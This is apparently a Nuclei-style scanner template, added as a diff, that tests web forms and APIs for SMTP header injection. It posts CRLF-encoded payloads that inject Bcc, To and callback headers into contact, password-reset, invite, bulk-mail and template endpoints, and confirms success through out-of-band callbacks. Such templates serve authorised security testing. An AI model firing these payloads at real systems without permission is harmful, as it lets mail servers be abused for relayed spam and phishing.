@@ -1,0 +1,252 @@
+id: smtp-header-injection-relay-oob
+
+info:
+  name: SMTP Header Injection with Mail Relay OOB Detection
+  author: geeknik
+  severity: high
+  description: |
+    Detects SMTP header injection vulnerabilities that allow attackers to inject
+    arbitrary SMTP headers and relay emails through the target's mail server.
+    Uses OOB confirmation via email delivery to controlled mailbox and HTTP callbacks
+    to verify successful mail relay abuse.
+  reference:
+    - https://owasp.org/www-community/vulnerabilities/Mail_Header_Injection
+    - https://portswigger.net/kb/issues/00200800_smtp-header-injection
+    - https://book.hacktricks.xyz/pentesting-web/email-header-injection
+    - https://cwe.mitre.org/data/definitions/93.html
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:H/A:L
+    cvss-score: 8.3
+    cwe-id: CWE-93,CWE-20
+  tags: smtp,email,header-injection,mail-relay,oob,injection
+
+variables:
+  callback_url: "{{interactsh-url}}"
+  relay_id: "{{randstr}}"
+  test_email: "test-{{randstr}}@{{interactsh-url}}"
+  # SMTP Header Injection Payloads
+  smtp_header_payload_email: |
+    test@example.com%0d%0aBcc: {{test_email}}%0d%0aX-Mailer: HeaderInjection-{{relay_id}}%0d%0aX-Callback: {{callback_url}}/email-header-{{relay_id}}
+  smtp_header_payload_subject: |
+    Test Subject%0d%0aBcc: {{test_email}}%0d%0aX-Injected-Subject: {{relay_id}}%0d%0aX-Callback-Subject: {{callback_url}}/subject-header-{{relay_id}}
+  smtp_header_payload_message: |
+    Test message content.%0d%0a%0d%0aTo: {{test_email}}%0d%0aSubject: Injected Email via {{relay_id}}%0d%0aX-Callback-Message: {{callback_url}}/message-header-{{relay_id}}%0d%0a%0d%0aThis email was injected via SMTP header injection vulnerability.
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/contact"
+      - "{{BaseURL}}/feedback"
+      - "{{BaseURL}}/email"
+      - "{{BaseURL}}/sendmail"
+      - "{{BaseURL}}/mail"
+      - "{{BaseURL}}/newsletter"
+      - "{{BaseURL}}/subscribe"
+      - "{{BaseURL}}/support"
+
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+    payloads:
+      email_field:
+        - "email"
+        - "from"
+        - "sender"
+        - "reply-to"
+        - "to"
+
+      subject_field:
+        - "subject"
+        - "title"
+        - "topic"
+
+      message_field:
+        - "message"
+        - "body"
+        - "content"
+        - "text"
+
+    body: |
+      {{email_field}}={{smtp_header_payload_email}}&{{subject_field}}={{smtp_header_payload_subject}}&{{message_field}}={{smtp_header_payload_message}}
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/email"
+      - "{{BaseURL}}/api/contact"
+      - "{{BaseURL}}/api/mail"
+      - "{{BaseURL}}/api/sendmail"
+
+    headers:
+      Content-Type: application/json
+      Accept: application/json
+
+    body: |
+      {
+        "from": "{{smtp_header_payload_email}}",
+        "to": "admin@example.com",
+        "subject": "{{smtp_header_payload_subject}}",
+        "message": "{{smtp_header_payload_message}}",
+        "reply_to": "{{smtp_header_payload_email}}"
+      }
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/reset-password"
+      - "{{BaseURL}}/forgot-password"
+      - "{{BaseURL}}/password-reset"
+
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+
+    body: |
+      email={{smtp_header_payload_email}}&action=reset
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/invite"
+      - "{{BaseURL}}/share"
+      - "{{BaseURL}}/forward"
+
+    headers:
+      Content-Type: application/json
+
+    body: |
+      {
+        "emails": [
+          "{{smtp_header_payload_email}}",
+          "user2@example.com"
+        ],
+        "message": "{{smtp_header_payload_message}}",
+        "callback_url": "{{callback_url}}/invite-{{relay_id}}"
+      }
+
+  - method: PUT
+    path:
+      - "{{BaseURL}}/profile"
+      - "{{BaseURL}}/account"
+      - "{{BaseURL}}/settings/email"
+
+    headers:
+      Content-Type: application/json
+
+    body: |
+      {
+        "email": "{{smtp_header_payload_email}}",
+        "notification_email": "{{test_email}}",
+        "backup_email": "backup{{smtp_header_payload_email}}"
+      }
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/webhook/email"
+      - "{{BaseURL}}/notification/email"
+      - "{{BaseURL}}/alert/email"
+
+    headers:
+      Content-Type: application/json
+
+    body: |
+      {
+        "webhook_url": "{{callback_url}}/webhook-{{relay_id}}",
+        "email_config": {
+          "from": "{{smtp_header_payload_email}}",
+          "bcc": "{{test_email}}",
+          "headers": {
+            "X-Custom-Header": "{{relay_id}}",
+            "X-Callback": "{{callback_url}}/config-{{relay_id}}"
+          }
+        }
+      }
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/mail/template"
+      - "{{BaseURL}}/email/template"
+
+    headers:
+      Content-Type: application/json
+
+    body: |
+      {
+        "template": "contact",
+        "variables": {
+          "sender_email": "{{smtp_header_payload_email}}",
+          "reply_to": "{{test_email}}",
+          "custom_headers": "X-Template-Test: {{relay_id}}\r\nX-Callback-Template: {{callback_url}}/template-{{relay_id}}"
+        }
+      }
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/bulk-email"
+      - "{{BaseURL}}/mass-mail"
+      - "{{BaseURL}}/broadcast"
+
+    headers:
+      Content-Type: application/json
+
+    body: |
+      {
+        "recipients": [
+          "{{test_email}}",
+          "{{smtp_header_payload_email}}"
+        ],
+        "subject": "Bulk Email Test {{relay_id}}",
+        "message": "{{smtp_header_payload_message}}",
+        "sender": "{{smtp_header_payload_email}}",
+        "callback": "{{callback_url}}/bulk-{{relay_id}}"
+      }
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+          - "smtp"
+        condition: or
+
+      - type: word
+        part: interactsh_request
+        words:
+          - "email-header-"
+          - "subject-header-"
+          - "message-header-"
+          - "invite-"
+          - "webhook-"
+          - "config-"
+          - "template-"
+          - "bulk-"
+        condition: or
+
+    extractors:
+      - type: kval
+        part: interactsh_request
+        kval:
+          - interactsh_request
+        internal: true
+
+      - type: regex
+        part: interactsh_request
+        regex:
+          - "/(email-header|subject-header|message-header|invite|webhook|config|template|bulk)-([a-z0-9]+)"
+        group: 1,2
+
+      - type: regex
+        part: interactsh_request
+        regex:
+          - "X-Mailer:\\s*HeaderInjection-([a-z0-9]+)"
+        group: 1
+
+      - type: regex
+        part: interactsh_request
+        regex:
+          - "X-Injected-Subject:\\s*([a-z0-9]+)"
+        group: 1
+
+      - type: regex
+        part: interactsh_request
+        regex:
+          - "X-Callback[^:]*:\\s*([^\\s]+)"
+        group: 1
